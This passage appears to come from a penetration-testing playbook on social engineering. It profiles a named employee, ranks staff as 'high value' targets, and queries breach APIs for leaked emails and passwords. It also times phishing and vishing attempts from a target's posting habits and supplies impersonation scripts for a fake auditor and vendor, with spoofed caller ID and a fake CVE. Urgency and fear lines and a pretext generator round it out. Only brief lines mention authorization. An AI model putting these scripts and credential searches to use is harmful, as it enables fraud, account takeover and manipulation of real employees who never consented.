            'repos': ['internal-scripts', 'homelab-configs'],
            'languages': ['Python', 'PowerShell', 'Bash']
        },
        'twitter': {
            'handle': '@jsmith_it',
            'interests': ['cybersecurity', 'homelab', 'gaming'],
            'recent_posts': ['Excited about new Azure deployment']
        }
    },
    'attack_vectors': [
        'Phishing: Azure admin notification',
        'Pretext: IT vendor support call',
        'Baiting: PowerShell cheat sheet USB'
    ]
}
print(json.dumps(profile, indent=2))
"
```

### Relationship Mapping with Maltego

```bash
# Maltego transform chain for organizational mapping
# Export results to structured format for SE campaign planning

# Step 1: Domain to employees
maltego-cli transform "Domain to Email" -i "target-company.com" -o employees.csv

# Step 2: Cross-reference with LinkedIn (manual or API)
# Build org chart from public data
python3 -c "
import json

org_chart = {
    'ceo': {'name': 'CEO Name', 'email': 'ceo@target.com', 'reports': ['cto', 'cfo', 'coo']},
    'cto': {'name': 'CTO Name', 'email': 'cto@target.com', 'reports': ['it_director']},
    'it_director': {'name': 'IT Dir', 'email': 'itdir@target.com', 'reports': ['sysadmin1', 'sysadmin2']},
    'sysadmin1': {'name': 'John Smith', 'email': 'jsmith@target.com', 'reports': []}
}

# Identify best SE targets (people with access but lower security awareness)
for role, info in org_chart.items():
    if 'admin' in role or 'director' in role:
        print(f\"[HIGH VALUE] {info['name']} ({role}) - {info['email']}\")
print(json.dumps(org_chart, indent=2))
"
```

### Credential Exposure Search

```bash
# Search for leaked credentials associated with target organization
# Check Have I Been Pwned API (authorized use only)
curl -s -H "hibp-api-key: ${HIBP_API_KEY}" \
  "https://haveibeenpwned.com/api/v3/breachedaccount/target@target-company.com" | jq '.[].Name'

# Search paste sites for exposed credentials
# dehashed.com API query
curl -s "https://api.dehashed.com/search?query=domain:target-company.com" \
  -H "Accept: application/json" \
  -u "${DEHASHED_EMAIL}:${DEHASHED_API_KEY}" | jq '.entries[] | {email, password, database_name}'

# GitHub dork for credential exposure
gh search code "target-company.com password" --limit 20
gh search code "target-company.com api_key" --limit 20
gh search code "target-company.com secret" --limit 20
```

### Social Media Activity Pattern Analysis

```bash
# Analyze posting patterns to determine work schedule and habits
python3 -c "
from collections import Counter
import json

# Simulated tweet timestamps (replace with actual data collection)
post_times = [
    '08:30', '09:15', '12:05', '12:30', '17:45', '18:00',
    '08:45', '09:00', '12:15', '17:30', '22:00', '22:30'
]

hours = Counter(t.split(':')[0] for t in post_times)
print('Activity Pattern:')
for hour in sorted(hours.keys()):
    bar = '#' * hours[hour]
    print(f'  {hour}:00 | {bar} ({hours[hour]})')

print()
print('Insights:')
print('- Active mornings 08-09: likely starts work early')
print('- Lunch break posts 12:00-12:30: predictable break time')
print('- Evening activity 17-18: leaves work around 5pm')
print('- Late night 22:00: personal device usage')
print()
print('Best phishing send time: 08:00-09:00 (mimics morning notifications)')
print('Best vishing time: 12:00-12:30 (guard down during break)')
"
```

---

## 13. Pretexting Frameworks

### Authority-Based Pretext Templates

```bash
# Generate pretexting scenarios based on authority exploitation
cat << 'EOF'
=== PRETEXT SCENARIO: IT SECURITY AUDIT ===

Role: External IT Security Auditor
Authority: Hired by CISO (name-drop if known)
Objective: Obtain credentials or physical access

Script:
"Hi, I'm [Name] from [Fake Security Firm]. We've been engaged by
[CISO Name] to conduct the annual security assessment. I need to
verify your workstation compliance. Could you log into [URL] so I
can check your security settings?"

Props needed:
- Business card (fake security firm)
- Clipboard with "audit checklist"
- Laptop with official-looking scanning tool
- Badge with company logo

Escalation path:
1. If challenged: "You can verify with [CISO Name]'s office"
2. If still challenged: "I understand, let me have them call you"
3. Abort trigger: Security team called, actual verification attempted

=== PRETEXT SCENARIO: VENDOR SUPPORT ===

Role: Software Vendor Technical Support
Authority: Existing vendor relationship
Objective: Remote access to target systems

Script:
"This is [Name] from [Known Vendor] support. We've detected a
critical vulnerability in your [Product] installation that requires
an emergency patch. I need remote access to apply the fix before
the exploit goes public tomorrow."

Props needed:
- Spoofed caller ID matching vendor
- Knowledge of target's software stack
- Fake CVE reference number
- Urgency and time pressure
EOF
```

### Scenario-Based Pretext Generator

```python
#!/usr/bin/env python3
"""Generate customized pretexting scenarios based on target profile."""
import json
import random

SCENARIOS = {
    "it_support": {
        "role": "IT Help Desk",
        "pretexts": [
            "Password expiry notification requiring immediate reset",
            "Mandatory security update requiring remote access",
            "Account compromise alert requiring credential verification",
            "VPN certificate renewal requiring re-enrollment"
        ],
        "urgency": "high",
        "authority": "IT Department"
    },
    "hr_benefits": {
        "role": "HR Benefits Coordinator",
        "pretexts": [
            "Annual benefits enrollment deadline approaching",
            "Tax form W-2 verification required",
            "Bonus/raise notification requiring portal login",
            "Emergency contact update for compliance"
        ],
        "urgency": "medium",
        "authority": "Human Resources"
    },
    "executive": {
        "role": "Executive Assistant",
        "pretexts": [
            "CEO needs urgent document review",
            "Board meeting materials require immediate access",
            "Confidential merger document for review",
            "Wire transfer approval needed urgently"
        ],
        "urgency": "critical",
        "authority": "C-Suite"
    }
}

def generate_pretext(target_role, target_name):
    scenario = random.choice(list(SCENARIOS.values()))
    pretext = random.choice(scenario["pretexts"])
    return {
        "target": target_name,
        "target_role": target_role,
        "attacker_role": scenario["role"],
        "pretext": pretext,
        "urgency": scenario["urgency"],
        "authority_source": scenario["authority"],
        "recommended_channel": "email" if scenario["urgency"] == "medium" else "phone"
    }

if __name__ == "__main__":
    result = generate_pretext("System Administrator", "John Smith")
    print(json.dumps(result, indent=2))
```

### Urgency and Scarcity Exploitation

```bash
# Templates leveraging psychological pressure tactics
cat << 'EOF'
=== URGENCY TRIGGERS ===

Time Pressure:
- "This must be completed within the next 30 minutes"
- "The system will be locked in 2 hours if not resolved"
- "The deadline was yesterday, we need this NOW"

Scarcity:
- "Only 3 spots remaining for the security training"
- "This offer expires at end of business today"
- "Limited access window before the maintenance begins"

Authority + Urgency:
- "The CEO is waiting for this in the board meeting RIGHT NOW"
- "Legal has mandated this be completed before close of business"
- "The auditors arrive tomorrow and this must be resolved today"

Fear:
- "Your account has been compromised and will be disabled"
- "Suspicious activity detected - immediate verification required"
- "Compliance violation detected - respond within 1 hour"

Social Proof:
- "Everyone in your department has already completed this"
- "Your manager has already approved and is waiting for your part"
- "The rest of the team finished yesterday"
EOF
```

### Pretext Validation Checklist

```bash
# Validate pretext before execution
cat << 'EOF'
PRETEXT VALIDATION CHECKLIST:

[ ] Backstory is internally consistent
[ ] Role matches known vendor/department relationships
[ ] Technical details are accurate for target environment
[ ] Timing aligns with target's business calendar
[ ] Authority figure referenced is real and verifiable
[ ] Fallback story prepared if challenged
[ ] Communication channel matches pretext (email vs phone vs in-person)
[ ] Props and supporting materials prepared
[ ] Abort criteria defined
[ ] Legal authorization documented and accessible

RED FLAGS TO AVOID:
- Asking for information the pretexted role would already have
- Using terminology inconsistent with the role
- Inability to answer basic questions about the pretexted organization
- Excessive urgency that seems unrealistic
- Requesting actions outside normal business processes
EOF
```
